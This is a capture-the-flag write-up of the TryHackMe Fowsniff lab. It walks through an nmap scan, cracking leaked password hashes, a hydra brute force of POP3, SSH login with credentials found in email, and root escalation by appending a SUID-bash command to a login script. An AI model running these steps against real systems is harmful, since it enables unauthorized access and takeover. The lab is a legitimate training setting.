---
title: "TryHackMe - Fowsniff CTF"
author: Nasrallah
description: ""
date: 2022-10-13 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, pop3, breach, crack, hydra, bruteforce]
img_path: /assets/img/tryhackme/fowsniff
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Fowsniff CTF](https://tryhackme.com/room/ctf) from [TryHackMe](https://tryhackme.com). Fowsniff suffered from a data breach where username, emails and passwords got leaked, we brute force a mail server using the leaked data and find some credentials. After logging in to the mail server we find an email that gives us ssh credentials granting us a foothold to the machine. After that we find a shell script that's being run every time a user connects to the machine, we exploit that to get root access. 

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.243.80                                             
Host is up (0.11s latency).                                                   
Not shown: 996 closed tcp ports (reset) 
PORT    STATE SERVICE VERSION                                                                                                                                
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                                               
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)                                                                                               
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)          
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))                       
| http-robots.txt: 1 disallowed entry                                         
|_/                                                                           
|_http-title: Fowsniff Corp - Delivering Solutions                         
|_http-server-header: Apache/2.4.18 (Ubuntu)                               
110/tcp open  pop3    Dovecot pop3d                                           
|_pop3-capabilities: CAPA USER PIPELINING SASL(PLAIN) TOP RESP-CODES AUTH-RESP-CODE UIDL
143/tcp open  imap    Dovecot imapd                                           
|_imap-capabilities: ID IDLE post-login have SASL-IR listed AUTH=PLAINA0001 LITERAL+ more OK ENABLE Pre-login IMAP4rev1 LOGIN-REFERRALS capabilities
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 4 ports open on an Ubuntu machine, port 22 running OpenSSH, port 80 running an Apache web server, port 110 running Docecot pop3 and port 143 running dovecot imap.

### Web

Let's navigate to the web page.

![](1.png)

The website belongs to **FOWSNIFF CORP**. We can see that they have published some important news.

![](2.png)

There is a data breach of there internal server, and the hackers used the corporation's twitter account to share sensitive information.

![](3.png)

Let's take a look at the twitter account.

![](4.png)

We found a link to a pastebin.

![](5.png)

Let's go to the gihub link.

![](6.png)

We found some usernames, emails and passwords of employees of Fowsniff corp.

The password looks like md5 hashes, so we can crack them easily using [crackstation.net](https://crackstation.net/)

![](7.png)


## **Foothold**

Let's create a list of usernames and passwords we cracked.

![](8.png)

Using the lists, let's brute force the pop3 service using `hydra`.

```hydra
hydra -L usernames.lst -P passwords.lst 10.10.243.80 pop3
```

![](9.png)

We got the username and password.

Let's connect the pop3 server using the command `telnet {Target_IP} 110`, submit the username with `USER {username}` and password with `PASS {password}`.

We can list the available messages with `LIST` and show a specific message with `RETR n`.

![](10.png)

In one of the emails, we found ssh credentials, let's connect to the machine using them.

![](11.png)

## **Privilege Escalation**

I uploaded a copy of linpeas to the target, run it and got the following.

![](12.png)

There is a file writeable by our group called `cube.sh`, let's take a look at it.

```terminal
baksteen@fowsniff:~$ cd /opt/cube/
baksteen@fowsniff:/opt/cube$ cat cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

```

This looks like the banner we got when we logged in via ssh, seems like the file is being executed every time someone logs in to the machine via ssh.

I added the following command to the script that would make a copy of bash in /tmp and give it the suid bit.

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> cube.sh
```

Now we need to exit and reconnect to run our command.

![](13.png)

The script was run by root so we easily got a root shell.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
